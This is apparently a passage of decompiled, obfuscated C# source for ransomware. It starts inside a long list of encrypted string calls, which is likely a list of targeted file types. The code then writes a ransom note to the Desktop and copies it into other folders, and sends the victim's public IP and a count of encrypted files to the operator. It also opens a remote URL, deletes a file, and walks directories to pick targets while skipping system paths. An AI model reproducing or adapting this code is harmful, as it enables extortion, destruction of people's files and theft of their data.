				getString_0(107384695),
				getString_0(107384690),
				getString_0(107384717),
				getString_0(107384712),
				getString_0(107384707),
				getString_0(107384158),
				getString_0(107384153),
				getString_0(107384148),
				getString_0(107384171),
				getString_0(107384166),
				getString_0(107384161),
				getString_0(107384124),
				getString_0(107384115),
				getString_0(107384134),
				getString_0(107384089),
				getString_0(107384080),
				getString_0(107384107),
				getString_0(107384102),
				getString_0(107384097),
				getString_0(107384060),
				getString_0(107384055),
				getString_0(107384050),
				getString_0(107384077),
				getString_0(107384072),
				getString_0(107384067),
				getString_0(107384030),
				getString_0(107384025),
				getString_0(107384016),
				getString_0(107384043),
				getString_0(107384038),
				getString_0(107384033),
				getString_0(107383996),
				getString_0(107383991),
				getString_0(107383986),
				getString_0(107384013),
				getString_0(107384008),
				getString_0(107384003),
				getString_0(107383966),
				getString_0(107383961),
				getString_0(107383956),
				getString_0(107383951),
				getString_0(107383978),
				getString_0(107383973),
				getString_0(107383968),
				getString_0(107383931),
				getString_0(107383922),
				getString_0(107383945),
				getString_0(107383940),
				getString_0(107383935),
				getString_0(107384410),
				getString_0(107384405),
				getString_0(107384400),
				getString_0(107384423),
				getString_0(107384418),
				getString_0(107384381),
				getString_0(107384372),
				getString_0(107384367),
				getString_0(107384394),
				getString_0(107384345),
				getString_0(107384340),
				getString_0(107384335),
				getString_0(107384362),
				getString_0(107384357),
				getString_0(107384352),
				getString_0(107384315),
				getString_0(107384306),
				getString_0(107384333),
				getString_0(107384328),
				getString_0(107384323),
				getString_0(107384286),
				getString_0(107384281),
				getString_0(107384276),
				getString_0(107384271),
				getString_0(107384298),
				getString_0(107384293),
				getString_0(107384288),
				getString_0(107384251),
				getString_0(107384246),
				getString_0(107384241),
				getString_0(107384268),
				getString_0(107384263),
				getString_0(107384258),
				getString_0(107384221),
				getString_0(107384216),
				getString_0(107384211),
				getString_0(107384234),
				getString_0(107384229),
				getString_0(107384224),
				getString_0(107384187),
				getString_0(107384182),
				getString_0(107384205),
				getString_0(107384200),
				getString_0(107384195),
				getString_0(107383646),
				getString_0(107383641),
				getString_0(107383636),
				getString_0(107383631),
				getString_0(107383658),
				getString_0(107383649),
				getString_0(107383612),
				getString_0(107383607),
				getString_0(107383630),
				getString_0(107383581),
				getString_0(107383576),
				getString_0(107383571),
				getString_0(107383598),
				getString_0(107383589),
				getString_0(107383584),
				getString_0(107383539),
				getString_0(107383562),
				getString_0(107383553),
				getString_0(107383516),
				getString_0(107383511),
				getString_0(107383506),
				getString_0(107383533),
				getString_0(107383528),
				getString_0(107383523),
				getString_0(107383482),
				getString_0(107383477),
				getString_0(107383500),
				getString_0(107383495),
				getString_0(107383490),
				getString_0(107383453),
				getString_0(107383448),
				getString_0(107383443),
				getString_0(107383470),
				getString_0(107383465),
				getString_0(107383460),
				getString_0(107383455),
				getString_0(107383418),
				getString_0(107383413),
				getString_0(107383408),
				getString_0(107383435),
				getString_0(107383430),
				getString_0(107383901),
				getString_0(107383896),
				getString_0(107383891),
				getString_0(107383918),
				getString_0(107383913),
				getString_0(107383908),
				getString_0(107383903),
				getString_0(107383866),
				getString_0(107383857),
				getString_0(107383884),
				getString_0(107383875),
				getString_0(107383838),
				getString_0(107383833),
				getString_0(107383828),
				getString_0(107383851),
				getString_0(107383842),
				getString_0(107383805),
				getString_0(107383800),
				getString_0(107383791),
				getString_0(107383818),
				getString_0(107383813),
				getString_0(107383808),
				getString_0(107383771),
				getString_0(107383762),
				getString_0(107383789),
				getString_0(107383784),
				getString_0(107383775),
				getString_0(107383734),
				getString_0(107383729),
				getString_0(107383752),
				getString_0(107383747),
				getString_0(107383706),
				getString_0(107383697),
				getString_0(107383724),
				getString_0(107383719),
				getString_0(107383714),
				getString_0(107383677),
				getString_0(107383672),
				getString_0(107383667),
				getString_0(107383694),
				getString_0(107383689),
				getString_0(107383132),
				getString_0(107383127),
				getString_0(107383150),
				getString_0(107383145),
				getString_0(107383140),
				getString_0(107383099),
				getString_0(107383090),
				getString_0(107383117),
				getString_0(107383112),
				getString_0(107383107),
				getString_0(107383066),
				getString_0(107383061),
				getString_0(107383056),
				getString_0(107383079),
				getString_0(107383034),
				getString_0(107383029),
				getString_0(107383048),
				getString_0(107383043),
				getString_0(107383002),
				getString_0(107382997),
				getString_0(107382992),
				getString_0(107383019),
				getString_0(107383014),
				getString_0(107382973),
				getString_0(107382964),
				getString_0(107382987),
				getString_0(107382942),
				getString_0(107382937),
				getString_0(107382928),
				getString_0(107382955),
				getString_0(107382950),
				getString_0(107382945),
				getString_0(107382904),
				getString_0(107382899),
				getString_0(107382926),
				getString_0(107382917),
				getString_0(107383388),
				getString_0(107383383),
				getString_0(107383402),
				getString_0(107383393),
				getString_0(107383356),
				getString_0(107383351),
				getString_0(107383346),
				getString_0(107383373),
				getString_0(107383368),
				getString_0(107383363),
				getString_0(107383326),
				getString_0(107383321),
				getString_0(107383316),
				getString_0(107383311),
				getString_0(107383330),
				getString_0(107383293),
				getString_0(107383288),
				getString_0(107383283),
				getString_0(107383298),
				getString_0(107383261),
				getString_0(107383256),
				getString_0(107383247),
				getString_0(107383274),
				getString_0(107383269),
				getString_0(107383264),
				getString_0(107383227),
				getString_0(107383222),
				getString_0(107383217),
				getString_0(107383236),
				getString_0(107383195),
				getString_0(107383190),
				getString_0(107383185),
				getString_0(107383212),
				getString_0(107383207),
				getString_0(107383166),
				getString_0(107383157),
				getString_0(107383152),
				getString_0(107383179),
				getString_0(107383170),
				getString_0(107382621),
				getString_0(107382616),
				getString_0(107382611),
				getString_0(107382638),
				getString_0(107382633),
				getString_0(107382628),
				getString_0(107382623),
				getString_0(107382586),
				getString_0(107382577),
				getString_0(107382604),
				getString_0(107382599),
				getString_0(107382594),
				getString_0(107382553),
				getString_0(107382548),
				getString_0(107382571),
				getString_0(107382566),
				getString_0(107382561),
				getString_0(107382520),
				getString_0(107382515),
				getString_0(107382542),
				getString_0(107382537),
				getString_0(107382532),
				getString_0(107382491),
				getString_0(107382482),
				getString_0(107382509),
				getString_0(107382504),
				getString_0(107382499),
				getString_0(107382462),
				getString_0(107382457),
				getString_0(107382448),
				getString_0(107382471),
				getString_0(107382466),
				getString_0(107382429),
				getString_0(107382424),
				getString_0(107382419),
				getString_0(107382446),
				getString_0(107382441),
				getString_0(107382436),
				getString_0(107382431),
				getString_0(107382394),
				getString_0(107382389),
				getString_0(107382412),
				getString_0(107382407),
				getString_0(107382402),
				getString_0(107382877),
				getString_0(107382868),
				getString_0(107382863),
				getString_0(107382890),
				getString_0(107382885),
				getString_0(107382880),
				getString_0(107382843),
				getString_0(107382838),
				getString_0(107382833),
				getString_0(107382860),
				getString_0(107382855),
				getString_0(107382850),
				getString_0(107382813),
				getString_0(107382808),
				getString_0(107382803),
				getString_0(107382826),
				getString_0(107382821),
				getString_0(107382816),
				getString_0(107382779),
				getString_0(107382770),
				getString_0(107382793),
				getString_0(107382788),
				getString_0(107382747),
				getString_0(107382738),
				getString_0(107382765),
				getString_0(107382756),
				getString_0(107382711),
				getString_0(107382730),
				getString_0(107382685),
				getString_0(107382680),
				getString_0(107382675),
				getString_0(107382702),
				getString_0(107382697),
				getString_0(107382688),
				getString_0(107382651),
				getString_0(107382646),
				getString_0(107382641),
				getString_0(107382668),
				getString_0(107382663),
				getString_0(107382658),
				getString_0(107382105),
				getString_0(107382100),
				getString_0(107382095),
				getString_0(107382122),
				getString_0(107382117),
				getString_0(107382112),
				getString_0(107382075),
				getString_0(107382070),
				getString_0(107382065),
				getString_0(107382092),
				getString_0(107382087),
				getString_0(107382082),
				getString_0(107382045),
				getString_0(107382036),
				getString_0(107382059),
				getString_0(107382054),
				getString_0(107382049),
				getString_0(107382012),
				getString_0(107382003),
				getString_0(107382030),
				getString_0(107382025),
				getString_0(107382020),
				getString_0(107382015),
				getString_0(107381974),
				getString_0(107381969),
				getString_0(107381992),
				getString_0(107381987),
				getString_0(107381950),
				getString_0(107381945),
				getString_0(107381940),
				getString_0(107381935),
				getString_0(107381962),
				getString_0(107381957),
				getString_0(107381952),
				getString_0(107381911),
				getString_0(107381934),
				getString_0(107381929),
				getString_0(107381920),
				getString_0(107381883),
				getString_0(107381878),
				getString_0(107381873),
				getString_0(107381900),
				getString_0(107381895),
				getString_0(107381890),
				getString_0(107382365),
				getString_0(107382360),
				getString_0(107382351),
				getString_0(107382378),
				getString_0(107382373),
				getString_0(107382332),
				getString_0(107382327),
				getString_0(107382322),
				getString_0(107382349),
				getString_0(107382344),
				getString_0(107382339),
				getString_0(107382302),
				getString_0(107382297),
				getString_0(107382292),
				getString_0(107382287),
				getString_0(107382314),
				getString_0(107382309),
				getString_0(107382304),
				getString_0(107382267),
				getString_0(107382262),
				getString_0(107382257),
				getString_0(107382284),
				getString_0(107382235),
				getString_0(107382246),
				getString_0(107382241),
				getString_0(107382204),
				getString_0(107382199),
				getString_0(107382218),
				getString_0(107382173),
				getString_0(107382160),
				getString_0(107382187),
				getString_0(107382182),
				getString_0(107382177),
				getString_0(107382140),
				getString_0(107382131),
				getString_0(107382154),
				getString_0(107382149),
				getString_0(107382144),
				getString_0(107381595),
				getString_0(107381590),
				getString_0(107381585),
				getString_0(107381612),
				getString_0(107381603),
				getString_0(107381566),
				getString_0(107381561),
				getString_0(107381580),
				getString_0(107381575),
				getString_0(107381534),
				getString_0(107381521),
				getString_0(107381544),
				getString_0(107381495),
				getString_0(107381514),
				getString_0(107381509),
				getString_0(107381504),
				getString_0(107381467),
				getString_0(107381458),
				getString_0(107381485),
				getString_0(107381480),
				getString_0(107381475),
				getString_0(107381438),
				getString_0(107381429),
				getString_0(107381452),
				getString_0(107381447),
				getString_0(107381442),
				getString_0(107381405),
				getString_0(107381396),
				getString_0(107381391),
				getString_0(107381418),
				getString_0(107381413),
				getString_0(107381408),
				getString_0(107381371),
				getString_0(107381366),
				getString_0(107381361),
				getString_0(107381388),
				getString_0(107381383),
				getString_0(107381378),
				getString_0(107381853),
				getString_0(107381848),
				getString_0(107381843),
				getString_0(107381858),
				getString_0(107381821),
				getString_0(107381816),
				getString_0(107381811),
				getString_0(107381834),
				getString_0(107381825),
				getString_0(107381788),
				getString_0(107381779),
				getString_0(107381806),
				getString_0(107381793),
				getString_0(107381744),
				getString_0(107381771),
				getString_0(107381766),
				getString_0(107381761),
				getString_0(107381720),
				getString_0(107381715),
				getString_0(107381742),
				getString_0(107381729),
				getString_0(107381688),
				getString_0(107381683),
				getString_0(107381710),
				getString_0(107381705),
				getString_0(107381696),
				getString_0(107381659),
				getString_0(107381650),
				getString_0(107381673),
				getString_0(107381668),
				getString_0(107381663),
				getString_0(107381626),
				getString_0(107381617),
				getString_0(107381640),
				getString_0(107381635),
				getString_0(107381086),
				getString_0(107381081),
				getString_0(107381076),
				getString_0(107381071),
				getString_0(107381098),
				getString_0(107381093),
				getString_0(107381088),
				getString_0(107381047),
				getString_0(107381042),
				getString_0(107381069),
				getString_0(107381064),
				getString_0(107381059),
				getString_0(107381022),
				getString_0(107381017),
				getString_0(107381012),
				getString_0(107381007),
				getString_0(107381030),
				getString_0(107381025),
				getString_0(107380988),
				getString_0(107380983),
				getString_0(107381006),
				getString_0(107381001),
				getString_0(107380996),
				getString_0(107380951),
				getString_0(107380946),
				getString_0(107380973),
				getString_0(107380968),
				getString_0(107380963),
				getString_0(107380926),
				getString_0(107380921),
				getString_0(107380912),
				getString_0(107380939),
				getString_0(107380930),
				getString_0(107380893),
				getString_0(107380908),
				getString_0(107380903),
				getString_0(107380898),
				getString_0(107380861),
				getString_0(107380856),
				getString_0(107380851),
				getString_0(107380878),
				getString_0(107380873),
				getString_0(107380868),
				getString_0(107380863),
				getString_0(107381338),
				getString_0(107381329),
				getString_0(107381356),
				getString_0(107381351),
				getString_0(107381346),
				getString_0(107381309),
				getString_0(107381304),
				getString_0(107381299),
				getString_0(107381326),
				getString_0(107381321),
				getString_0(107381316),
				getString_0(107381311),
				getString_0(107381274),
				getString_0(107381269),
				getString_0(107381292),
				getString_0(107381283),
				getString_0(107381246),
				getString_0(107381241),
				getString_0(107381232),
				getString_0(107381259),
				getString_0(107381254),
				getString_0(107381213),
				getString_0(107381208),
				getString_0(107381203),
				getString_0(107381230),
				getString_0(107381225),
				getString_0(107381220),
				getString_0(107381215),
				getString_0(107381174),
				getString_0(107381169),
				getString_0(107381196),
				getString_0(107381191),
				getString_0(107381150),
				getString_0(107381145),
				getString_0(107381136),
				getString_0(107381159),
				getString_0(107381154),
				getString_0(107381117),
				getString_0(107381112),
				getString_0(107381103),
				getString_0(107381126),
				getString_0(107381121),
				getString_0(107413340),
				getString_0(107413335),
				getString_0(107413358),
				getString_0(107413353),
				getString_0(107413348),
				getString_0(107413307),
				getString_0(107413302),
				getString_0(107413321),
				getString_0(107413316),
				getString_0(107413311),
				getString_0(107413274),
				getString_0(107413269),
				getString_0(107413292),
				getString_0(107413287),
				getString_0(107413282),
				getString_0(107413241),
				getString_0(107413236),
				getString_0(107413231),
				getString_0(107413250),
				getString_0(107413213),
				getString_0(107413204),
				getString_0(107413199),
				getString_0(107413218),
				getString_0(107413181),
				getString_0(107413176),
				getString_0(107413171),
				getString_0(107413198),
				getString_0(107413193),
				getString_0(107413188),
				getString_0(107413183),
				getString_0(107413146),
				getString_0(107413141),
				getString_0(107413136),
				getString_0(107413163),
				getString_0(107413158),
				getString_0(107413117),
				getString_0(107413112),
				getString_0(107413103),
				getString_0(107413126),
				getString_0(107413121),
				getString_0(107413596),
				getString_0(107413587),
				getString_0(107413610),
				getString_0(107413605),
				getString_0(107413600),
				getString_0(107413559),
				getString_0(107413554),
				getString_0(107413581),
				getString_0(107413576),
				getString_0(107413571),
				getString_0(107413534),
				getString_0(107413529),
				getString_0(107413520),
				getString_0(107413547),
				getString_0(107413542),
				getString_0(107413537),
				getString_0(107413500),
				getString_0(107413495),
				getString_0(107413518),
				getString_0(107413513),
				getString_0(107413508),
				getString_0(107413503),
				getString_0(107413462),
				getString_0(107413485),
				getString_0(107413480),
				getString_0(107413475),
				getString_0(107413434),
				getString_0(107413425),
				getString_0(107413452),
				getString_0(107413443),
				getString_0(107413398),
				getString_0(107413393),
				getString_0(107413416),
				getString_0(107413411),
				getString_0(107413374),
				getString_0(107413369),
				getString_0(107413364),
				getString_0(107413359),
				getString_0(107413386),
				getString_0(107413381),
				getString_0(107413376),
				getString_0(107412827),
				getString_0(107412822),
				getString_0(107412817),
				getString_0(107412844),
				getString_0(107412839),
				getString_0(107412834),
				getString_0(107412793),
				getString_0(107412788),
				getString_0(107412783),
				getString_0(107412810),
				getString_0(107412801),
				getString_0(107412764),
				getString_0(107412755),
				getString_0(107412782),
				getString_0(107412777),
				getString_0(107412768),
				getString_0(107412727),
				getString_0(107412722),
				getString_0(107412749),
				getString_0(107412744),
				getString_0(107412739),
				getString_0(107412702),
				getString_0(107412693),
				getString_0(107412716),
				getString_0(107412703),
				getString_0(107412658),
				getString_0(107412685),
				getString_0(107412680),
				getString_0(107412671),
				getString_0(107412634),
				getString_0(107412625),
				getString_0(107412652),
				getString_0(107412647),
				getString_0(107412642),
				getString_0(107412601),
				getString_0(107412596),
				getString_0(107412619),
				getString_0(107412610),
				getString_0(107413081),
				getString_0(107413072),
				getString_0(107413099),
				getString_0(107413094),
				getString_0(107413089),
				getString_0(107413052),
				getString_0(107413043),
				getString_0(107413070),
				getString_0(107413065),
				getString_0(107413060),
				getString_0(107413055),
				getString_0(107413018),
				getString_0(107413013),
				getString_0(107413036),
				getString_0(107413031),
				getString_0(107413026),
				getString_0(107412989),
				getString_0(107412984),
				getString_0(107412979),
				getString_0(107413006),
				getString_0(107413001),
				getString_0(107412996),
				getString_0(107412991),
				getString_0(107412954),
				getString_0(107412949),
				getString_0(107412944),
				getString_0(107412967),
				getString_0(107412962),
				getString_0(107412925),
				getString_0(107412916),
				getString_0(107412911),
				getString_0(107412938),
				getString_0(107412933),
				getString_0(107412928),
				getString_0(107412891),
				getString_0(107412886),
				getString_0(107412909),
				getString_0(107412904),
				getString_0(107412899),
				getString_0(107412862),
				getString_0(107412857),
				getString_0(107412848),
				getString_0(107412875),
				getString_0(107412870),
				getString_0(107412865),
				getString_0(107412316),
				getString_0(107412311),
				getString_0(107412306),
				getString_0(107412333),
				getString_0(107412328),
				getString_0(107412319),
				getString_0(107412282),
				getString_0(107412277),
				getString_0(107412272),
				getString_0(107412295),
				getString_0(107412290),
				getString_0(107412253),
				getString_0(107412248),
				getString_0(107412243),
				getString_0(107412270),
				getString_0(107412261),
				getString_0(107412256),
				getString_0(107412219),
				getString_0(107412214),
				getString_0(107412237),
				getString_0(107412232),
				getString_0(107412227),
				getString_0(107412190),
				getString_0(107412185),
				getString_0(107412180),
				getString_0(107412175),
				getString_0(107412198),
				getString_0(107412193),
				getString_0(107412152),
				getString_0(107412143),
				getString_0(107412170),
				getString_0(107412165),
				getString_0(107412160),
				getString_0(107412123),
				getString_0(107412118),
				getString_0(107412113),
				getString_0(107412136),
				getString_0(107412131),
				getString_0(107412094),
				getString_0(107412089),
				getString_0(107412084),
				getString_0(107412107),
				getString_0(107412098),
				getString_0(107412573),
				getString_0(107412568),
				getString_0(107412563),
				getString_0(107412586),
				getString_0(107412581),
				getString_0(107412576),
				getString_0(107412535),
				getString_0(107412558),
				getString_0(107412545),
				getString_0(107412504),
				getString_0(107412495),
				getString_0(107412518),
				getString_0(107412477),
				getString_0(107412468),
				getString_0(107412463),
				getString_0(107412482),
				getString_0(107412441),
				getString_0(107412432),
				getString_0(107412459),
				getString_0(107412454),
				getString_0(107412413),
				getString_0(107412408),
				getString_0(107412399),
				getString_0(107412426),
				getString_0(107412417),
				getString_0(107412380),
				getString_0(107412375),
				getString_0(107412370),
				getString_0(107412389),
				getString_0(107412348),
				getString_0(107412343),
				getString_0(107412338),
				getString_0(107412365),
				getString_0(107412360),
				getString_0(107412351),
				getString_0(107411802),
				getString_0(107411793),
				getString_0(107411820),
				getString_0(107411815),
				getString_0(107411810),
				getString_0(107411769),
				getString_0(107411764),
				getString_0(107411759),
				getString_0(107411782),
				getString_0(107411777),
				getString_0(107411736),
				getString_0(107411727),
				getString_0(107411754),
				getString_0(107411749),
				getString_0(107411708),
				getString_0(107411699),
				getString_0(107411722),
				getString_0(107411717),
				getString_0(107411712),
				getString_0(107411675),
				getString_0(107411670),
				getString_0(107411693),
				getString_0(107411688),
				getString_0(107411683),
				getString_0(107411638),
				getString_0(107411657),
				getString_0(107411612),
				getString_0(107411599),
				getString_0(107411626),
				getString_0(107411621),
				getString_0(107411616),
				getString_0(107411579),
				getString_0(107411574),
				getString_0(107411569),
				getString_0(107411592),
				getString_0(107411587),
				getString_0(107412062),
				getString_0(107412053),
				getString_0(107412076),
				getString_0(107412071),
				getString_0(107412066),
				getString_0(107412029),
				getString_0(107412024),
				getString_0(107412019),
				getString_0(107412046),
				getString_0(107412041),
				getString_0(107412036),
				getString_0(107411995),
				getString_0(107411990),
				getString_0(107411985),
				getString_0(107412008),
				getString_0(107412003),
				getString_0(107411966),
				getString_0(107411961),
				getString_0(107411956),
				getString_0(107411951),
				getString_0(107411978),
				getString_0(107411969),
				getString_0(107411932),
				getString_0(107411927),
				getString_0(107411922)
			}, new string[0], hIWmgCgTMWgc(secureString), getString_0(107411945));
		}
		catch (Exception ex9)
		{
			if (WUCUbinjeq)
			{
				try
				{
					File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107411864) + ex9.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871));
				streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107411294)));
				streamWriter.WriteLine(getString_0(107396255));
				streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107407508)));
				streamWriter.WriteLine(gEeUOBrkGDECGn);
				if (HjogaXQARCSKCJ == getString_0(107396882))
				{
					streamWriter.WriteLine(getString_0(107396255));
					streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107407475)) + Convert.ToString(iqVERQUhagNsiaC.Count));
				}
				if (SWTAoziGpJs)
				{
					streamWriter.WriteLine(getString_0(107396255));
					streamWriter.WriteLine(ZszvXPTYjBtgjF(getString_0(107407942)));
					streamWriter.WriteLine(GtRYKNkRmbf.iFtjToyyGJbdg());
				}
			}
			else
			{
				string text3 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871));
				if (!text3.Contains(gEeUOBrkGDECGn) && !kzxgomJEqSw)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871), getString_0(107407909) + gEeUOBrkGDECGn);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in LJCJcQbJapSHJR)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107411871)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871), item + getString_0(107411871), overwrite: true);
				}
				else
				{
					string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871));
					if (!text4.Contains(gEeUOBrkGDECGn) && !kzxgomJEqSw)
					{
						File.AppendAllText(item + getString_0(107411871), getString_0(107407909) + gEeUOBrkGDECGn);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!gDuYPqPgoKOgrz && num > 10)
			{
				break;
			}
		}
		if (CtBsjNEdQzWTtB == getString_0(107396909))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407880)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407880));
					streamWriter2.WriteLine(ZszvXPTYjBtgjF(getString_0(107407847)));
					streamWriter2.WriteLine(getString_0(107396255));
					streamWriter2.WriteLine(ZszvXPTYjBtgjF(getString_0(107089099)));
					streamWriter2.WriteLine(gEeUOBrkGDECGn + ZszvXPTYjBtgjF(getString_0(107089490)));
					if (HjogaXQARCSKCJ == getString_0(107396882))
					{
						streamWriter2.WriteLine(getString_0(107396255));
						streamWriter2.WriteLine(ZszvXPTYjBtgjF(getString_0(107089509)) + ZszvXPTYjBtgjF(getString_0(107407475)) + Convert.ToString(iqVERQUhagNsiaC.Count) + ZszvXPTYjBtgjF(getString_0(107089490)));
					}
					if (SWTAoziGpJs)
					{
						streamWriter2.WriteLine(getString_0(107396255));
						streamWriter2.WriteLine(ZszvXPTYjBtgjF(getString_0(107407942)));
						streamWriter2.WriteLine(GtRYKNkRmbf.iFtjToyyGJbdg());
					}
				}
				else
				{
					string text5 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871));
					if (!text5.Contains(gEeUOBrkGDECGn) && !kzxgomJEqSw)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407880), ZszvXPTYjBtgjF(getString_0(107089509)) + getString_0(107407909) + gEeUOBrkGDECGn + ZszvXPTYjBtgjF(getString_0(107089490)));
					}
				}
			}
			catch
			{
			}
		}
		if (OSuDMxmnRmH == getString_0(107396909))
		{
			try
			{
				if (HjogaXQARCSKCJ == getString_0(107396882))
				{
					GtRYKNkRmbf.WUllNQmIlVwFwrS(getString_0(107089448), getString_0(107089443), getString_0(107089398), string.Concat(ZszvXPTYjBtgjF(getString_0(107396321)), new WebClient().DownloadString(ZszvXPTYjBtgjF(getString_0(107396296))), getString_0(107089421), ZszvXPTYjBtgjF(getString_0(107396218)), DateTime.Now, getString_0(107396255), ZszvXPTYjBtgjF(getString_0(107089416)), Convert.ToString(iqVERQUhagNsiaC.Count), getString_0(107396255), ZszvXPTYjBtgjF(getString_0(107396689)), gEeUOBrkGDECGn));
				}
				else
				{
					GtRYKNkRmbf.WUllNQmIlVwFwrS(getString_0(107089448), getString_0(107089443), getString_0(107089398), string.Concat(ZszvXPTYjBtgjF(getString_0(107396321)), new WebClient().DownloadString(ZszvXPTYjBtgjF(getString_0(107396296))), getString_0(107089421), ZszvXPTYjBtgjF(getString_0(107396218)), DateTime.Now, getString_0(107396255), ZszvXPTYjBtgjF(getString_0(107089416)), Convert.ToString(iqVERQUhagNsiaC.Count), getString_0(107396255), ZszvXPTYjBtgjF(getString_0(107396689)), gEeUOBrkGDECGn));
				}
			}
			catch
			{
			}
		}
		if (PDmRqfuJsMB == getString_0(107396909))
		{
			try
			{
				VmtTQbkPvxFxVx.RMcyXssnyQZ(new Uri(getString_0(107089335)));
			}
			catch
			{
			}
		}
		if (CtBsjNEdQzWTtB == getString_0(107396882))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871)))
				{
					Process.Start(ZszvXPTYjBtgjF(getString_0(107088621)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107411871));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407880)))
				{
					Process.Start(ZszvXPTYjBtgjF(getString_0(107088564)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107407880));
				}
			}
			catch
			{
			}
		}
		if (wHIUGaHkbqZ == getString_0(107396909))
		{
			if (NAuVcBiAFcWa == getString_0(107396909) && !string.IsNullOrEmpty(NwYxCJSnEoN) && !string.IsNullOrEmpty(DfnXcorpnTcs))
			{
				etTkwMGpjm(NwYxCJSnEoN, DfnXcorpnTcs);
			}
			else
			{
				etTkwMGpjm(getString_0(107088579), getString_0(107088550));
			}
		}
		if (uUjbLARyBBdnV != getString_0(107088796))
		{
			eFoVLMfpJZsWzob(uUjbLARyBBdnV);
		}
		if (!string.IsNullOrEmpty(dZCepYtuPbx))
		{
			try
			{
				File.Delete(dZCepYtuPbx);
			}
			catch
			{
			}
		}
		if (WUCUbinjeq)
		{
			try
			{
				File.AppendAllText(YPtXSOBdFjEyjx, getString_0(107088811));
			}
			catch (Exception)
			{
			}
		}
		if (DGMvhADQDhvvHBvW == getString_0(107088766))
		{
			VoAMpxkTccTxi();
		}
	}

	public static void gGQDHtMXrExt()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(ZszvXPTYjBtgjF(getString_0(107088757)), ZszvXPTYjBtgjF(getString_0(107088091)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int MpIjVOFgDVh(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> XdTwtlMADQST(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107088106)) && !text.Contains(getString_0(107088049)) && !text.Contains(getString_0(107088016)) && !text.ToLower().Contains(getString_0(107088031)) && !text.ToLower().Contains(getString_0(107087986)) && !text.Contains(getString_0(107088473)) && !text.Contains(getString_0(107088484)) && !text.ToLower().Contains(getString_0(107088435)) && !text.ToLower().Contains(getString_0(107088454)) && !text.ToLower().Contains(getString_0(107088417)) && !text.ToLower().Contains(getString_0(107088376)) && !text.ToLower().Contains(getString_0(107088391)) && !text.ToLower().Contains(getString_0(107088346)) && !text.ToLower().Contains(getString_0(107088365)) && !text.ToLower().Contains(getString_0(107088312)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107088319)) && !fileInfo.FullName.Contains(getString_0(107088302)) && !fileInfo.FullName.Contains(getString_0(107088253)) && !fileInfo.FullName.Contains(getString_0(107088268)) && !fileInfo.FullName.Contains(getString_0(107087707)) && !fileInfo.FullName.Contains(getString_0(107087722)) && !fileInfo.FullName.Contains(getString_0(107087673)) && !fileInfo.FullName.Contains(getString_0(107087688)) && !fileInfo.FullName.Contains(getString_0(107087643)) && !fileInfo.FullName.Contains(getString_0(107087654)) && !fileInfo.FullName.ToLower().Contains(getString_0(107087609)) && !fileInfo.FullName.ToLower().Contains(getString_0(107087628)) && !fileInfo.FullName.ToLower().Contains(getString_0(107087579)) && !fileInfo.FullName.ToLower().Contains(getString_0(107087594)) && !fileInfo.FullName.Contains(ZszvXPTYjBtgjF(getString_0(107087545))) && !fileInfo.FullName.Contains(getString_0(107087552)) && !fileInfo.FullName.Contains(getString_0(107087507)) && !fileInfo.FullName.Contains(getString_0(107087522)) && !fileInfo.FullName.EndsWith(getString_0(107411945)) && !fileInfo.FullName.EndsWith(getString_0(107087497)) && !fileInfo.FullName.EndsWith(getString_0(107087492)) && !fileInfo.FullName.EndsWith(getString_0(107087487)) && !fileInfo.FullName.EndsWith(getString_0(107087962)) && !fileInfo.FullName.Contains(getString_0(107087957)) && !fileInfo.FullName.Contains(kkipsSsrGYdH) && 